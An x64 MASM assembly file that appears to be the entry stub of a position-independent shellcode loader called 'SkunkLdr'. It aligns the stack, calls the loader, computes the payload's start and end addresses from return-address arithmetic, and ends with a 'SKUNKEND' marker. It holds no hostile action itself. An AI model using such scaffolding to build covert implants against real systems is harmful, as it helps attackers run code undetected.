.x64
.model flat, fastcall
option casemap:none
option win64:1

; Import SkunkLdr function
extern SkunkLdr:PROC

; Export procedures
public Start
public StRipStart
public StRipEnd

_TEXT$A segment

Start:
    push  rsi
    mov   rsi, rsp
    and   rsp, 0FFFFFFFFFFFFFFF0h
    sub   rsp, 020h
    call  SkunkLdr
    mov   rsp, rsi
    pop   rsi
    ret

StRipStart:
    call StRipPtrStart
    ret

StRipPtrStart:
    mov	rax, [rsp]
    sub rax, 01bh
    ret

_TEXT$A ends

_TEXT$C segment

StRipEnd:
    call StRetPtrEnd
    ret

StRetPtrEnd:
    mov rax, [rsp]
    add rax, 0bh
    ret

_TEXT$C ends

_TEXT$D segment

SymSkunkEnd:
    db 'S', 'K', 'U', 'N', 'K', 'E', 'N', 'D'

_TEXT$D ends

end
